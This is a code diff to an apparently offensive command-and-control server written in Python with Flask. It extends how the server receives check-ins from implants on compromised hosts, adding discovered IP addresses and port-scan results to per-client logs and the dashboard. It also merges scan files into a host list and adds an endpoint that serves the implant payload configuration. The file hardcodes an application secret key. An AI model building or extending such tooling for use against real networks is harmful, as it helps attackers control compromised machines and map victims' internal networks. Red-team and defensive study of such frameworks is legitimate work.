@@ -103,15 +103,19 @@ def fromjson(value):
 def run_shell():
     while True:
         try:
-            # Simular bucle interactivo
             shell.cmdloop()
         except Exception as e:
             print(f"[ERROR] Shell loop crashed: {e}")
             break
 
 def load_banners():
-    with open('sessions/banners.json', 'r') as file:
-        config = json.load(file)
+    """Loads the banners from the JSON file."""
+    try:
+        with open('sessions/banners.json', 'r') as file:
+            config = json.load(file)
+    except FileNotFoundError:
+        print("Error: File banners.json not found")
+        return
     return config
 
 def load_mitre_data():
@@ -777,54 +781,103 @@ def read_and_forward_pty_output_c2():
 def get_discovered_hosts():
     """
     Reads the sessions/hostsdiscovery.txt file and returns a list of discovered hosts.
+    Also reads IPs from scan_discovery*.csv files in the sessions directory.
     """
     hosts_file_path = os.path.join('sessions', 'hostsdiscovery.txt')
     discovered_hosts = []
     local_ips = get_local_ip_addresses()
+
     try:
         with open(hosts_file_path, 'r') as f:
             for line in f:
                 ip_address = line.strip()
-                if ip_address and ip_address not in local_ips:
+                if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
                     discovered_hosts.append(ip_address)
+        if isinstance(local_ips, str):
+            if local_ips not in discovered_hosts:
+                discovered_hosts.append(local_ips)
+        elif isinstance(local_ips, list):
+            for ip in local_ips:
+                if ip not in discovered_hosts:
+                    discovered_hosts.append(ip)
+        elif isinstance(local_ips, str):
+            if local_ips not in discovered_hosts:
+                discovered_hosts.append(local_ips)
     except FileNotFoundError:
         print(f"Error: File not found at {hosts_file_path}")
-        return []
+
+    scan_files = glob.glob(os.path.join('sessions', 'scan_discovery*.csv'))
+    if scan_files:
+        for file_path in scan_files:
+            try:
+                with open(file_path, 'r') as f:
+                    next(f)
+                    for line in f:
+                        line = line.strip()
+                        if line:
+                            parts = line.split(';')
+                            if len(parts) > 0:
+                                ip_address = parts[0].strip('"')
+                                if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
+                                    discovered_hosts.append(ip_address)
+            except FileNotFoundError:
+                print(f"Error: Scan discovery file not found at {file_path}")
+            except Exception as e:
+                print(f"Error reading scan discovery file {file_path}: {e}")
+
     return discovered_hosts
 
 def get_local_ip_addresses():
+    local_ips = []
     try:
-        # Ejecuta el comando para obtener la información de la dirección IP
         process = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
         output = process.stdout
 
-        # Analiza la salida para encontrar tu dirección IP (ejemplo para una interfaz llamada 'eth0' o 'wlan0')
         for line in output.splitlines():
-            if 'inet ' in line and ('eth0' in line or 'wlan0' in line):
-                ip_address = line.split()[1].split('/')[0]
+            if 'inet ' in line:
+                parts = line.split()
+                ip_address = parts[1].split('/')[0]
                 if ip_address != "127.0.0.1":
-                    return ip_address
-            elif 'inet ' in line and 'tun0' in line:  # Considerar la interfaz tun0 si está presente
-                ip_address = line.split()[1].split('/')[0]
-                return ip_address
-            elif 'inet ' in line and 'br-' in line: # Considerar interfaces bridge (Docker)
-                ip_address = line.split()[1].split('/')[0]
-                return ip_address
-            # Agrega más condiciones 'elif' si necesitas buscar en otras interfaces específicas
+                    if ('eth0' in line or 'wlan0' in line or 'tun0' in line or 'br-' in line):
+                        local_ips.append(ip_address)
+                    elif 'lo' not in line and not any(prefix in line for prefix in ['docker', 'veth']):
+                        local_ips.append(ip_address)
 
-        # Si no se encuentra en las interfaces comunes, intenta encontrar alguna IP no loopback
-        for line in output.splitlines():
-            if 'inet ' in line and 'lo' not in line:
-                ip_address = line.split()[1].split('/')[0]
-                return ip_address
-
-        return "No se pudo obtener la IP del servidor desde el sistema operativo."
-
+        if not local_ips:
+            return "No se pudo obtener la IP del servidor desde el sistema operativo."
+        return local_ips
     except subprocess.CalledProcessError as e:
         return f"Error al ejecutar el comando: {e}"
     except FileNotFoundError:
         return "El comando 'ip' no se encontró en el sistema."
-    
+
+def sanitize_json(data):
+    """
+    Elimina datos sensibles del diccionario JSON.
+    Adaptar esta función según la estructura específica de tu payload.json.
+    """
+    if isinstance(data, dict):
+        keys_to_remove = ["c2_user", "c2_pass", "api_key", "telegram_token", "discord_token", "start_user", "start_pass", "rat_key", "email_from", "email_password", "email_username"]
+        for key in list(data.keys()):  # Iterar sobre una copia de las claves para poder eliminarlas
+            if key in keys_to_remove or "secret" in key.lower():
+                del data[key]
+            elif isinstance(data[key], (dict, list)):
+                data[key] = sanitize_json(data[key])
+        return data
+    elif isinstance(data, list):
+        return [sanitize_json(item) for item in data]
+    return data
+
+def add_dynamic_data(data):
+    """
+    Agrega datos dinámicos al diccionario JSON si es necesario,
+    basándose en el contenido del diccionario 'data'.
+    """
+    data['timestamp'] = 'now' 
+
+    return data
+
+
 app = Flask(__name__, static_folder='static')
 app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja'
 app.config['SECRET_KEY'] = app.secret_key
@@ -1003,6 +1056,8 @@ def index():
     hostname = {}
     ips = {}
     user = {}
+    discovered_ips = {}
+    result_portscan = {}
     for client_id in connected_clients_list:
         csv_file = f"sessions/{client_id}.log"
         try:
@@ -1017,6 +1072,8 @@ def index():
                         hostname[client_id] = rows[-1]['hostname']
                         ips[client_id] = rows[-1]['ips']
                         user[client_id] = rows[-1]['user']
+                        discovered_ips[client_id] = rows[-1]['discovered_ips']
+                        result_portscan[client_id] = rows[-1]['result_portscan']
                      
         except Exception as e:
             print("[Error] implant logs corrupted.")
@@ -1064,7 +1121,9 @@ def index():
         current_user_id = current_user.id,
         elo=current_user.elo,
         prompt = prompt,
-        local_ips= local_ips
+        local_ips= local_ips,
+        discovered_ips=discovered_ips,
+        result_portscan=result_portscan
     )
 
 @app.route('/command/<client_id>', methods=['GET'])
@@ -1096,7 +1155,7 @@ def receive_result(client_id):
         if client_id not in connected_clients:
             connected_clients.add(client_id)
             print(f"New client connected: {client_id}")        
-        if not data or not all(key in data for key in ['output', 'command', 'client', 'pid', 'hostname', 'ips', 'user']):
+        if not data or not all(key in data for key in ['output', 'command', 'client', 'pid', 'hostname', 'ips', 'user', 'discovered_ips', 'result_portscan']):
             return jsonify({"status": "error", "message": "Invalid data format"}), 400
 
         output = data['output']
@@ -1105,7 +1164,10 @@ def receive_result(client_id):
         hostname = data['hostname']
         ips = data['ips']
         user = data['user']
+        discovered_ips = data['discovered_ips']
+        result_portscan = data['result_portscan']
         command = data['command']
+
 
         if not all([command, output, client_id]):
             return jsonify({"status": "error", "message": "Required fields cannot be empty"}), 400
@@ -1137,7 +1199,7 @@ def receive_result(client_id):
             with open(csv_file_abs, 'a', newline='') as f:
                 writer = csv.writer(f)
                 if not file_exists:
-                    writer.writerow(["client_id", "os", "pid", "hostname", "ips", "user", "command", "output"])
+                    writer.writerow(["client_id", "os", "pid", "hostname", "ips", "user","discovered_ips", "result_portscan", "command", "output"])
 
                 safe_data = [
                     str(sanitized_client_id),
@@ -1146,6 +1208,8 @@ def receive_result(client_id):
                     str(hostname)[:100],
                     str(ips)[:100],
                     str(user)[:50],
+                    str(discovered_ips)[:1000],
+                    str(result_portscan)[:1000],
                     str(command)[:500],
                     str(output)[:1000]
                 ]
@@ -1158,6 +1222,8 @@ def receive_result(client_id):
                 "hostname": hostname,
                 "ips": ips,
                 "user": user,
+                "discovered_ips": discovered_ips,
+                "result_portscan": result_portscan,
                 "command": command
             }
 
@@ -2154,7 +2220,8 @@ def banners():
     if response:
         return response    
     banners_json = load_banners()
-
+    if not banners_json:
+        return render_template('banners.html', title="Target's Information", content="No banners found.")
     html_table = '<table class="table table-dark table-striped">\n'
     html_table += '  <thead>\n'
     html_table += '    <tr>\n'
@@ -2476,6 +2543,24 @@ def internal_server_error(e):
     if response:
         return response    
     return render_template('500.html'), 500
+
+@app.route('/config.json')
+def get_config():
+    """
+    Lee el archivo payload.json, lo manipula y lo expone como /config.json.
+    """
+    try:
+        with open('payload.json', 'r') as f:
+            payload = json.load(f)
+    except FileNotFoundError:
+        return jsonify({"error": "payload.json not found"}), 404
+    except json.JSONDecodeError:
+        return jsonify({"error": "Invalid JSON format in payload.json"}), 500
+
+    sanitized_payload = sanitize_json(payload)
+    final_payload = add_dynamic_data(sanitized_payload)
+
+    return jsonify(final_payload)
 
 thread = Thread(target=run_shell)
 thread.daemon = True
